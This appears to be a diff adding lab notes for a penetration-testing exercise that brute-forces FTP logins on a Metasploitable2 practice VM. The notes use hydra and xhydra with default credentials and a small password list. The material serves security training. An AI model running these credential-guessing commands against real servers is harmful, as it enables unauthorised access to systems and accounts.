@@ -1,0 +1,40 @@
+Open Metasploitable2 in VMware
+login metasploitable login: msfadmin
+		password  : msfadmin
+After login -->ifconfig(copy the ip)
+
+open terminal 
+------------
+hydra
+hydra -l msfadmin -p msfadmin ftp://<ip> (ex:192.168.136.130)
+
+open text editor add four lines as:
+admin
+user
+msfadmin
+itsme
+
+Save the file as password.txt
+
+hydra -l msfadmin -P password.txt ftp://<ip>(192.168.136.130)
+--------------------------------------------
+xhydra(a window will be opened)
+
+In that window Change:
+Single Target: <your ip>(ex:192.168.136.130)
+Protocol : ftp
+Port : 21
+------------------
+Go to Password tab:
+Username : msfadmin
+Password : msfadmin
+------------------
+Go to Start tab:
+ Click on start button(Login Successful)
+ Click on Stop button and clear output
+---------------
+Go to Passwords Tab:
+Click PasswordList in password section and chose the password.txt file
+Now Go to Start tab and start the session(Check the output)
+and Stop the session and close it
+ 
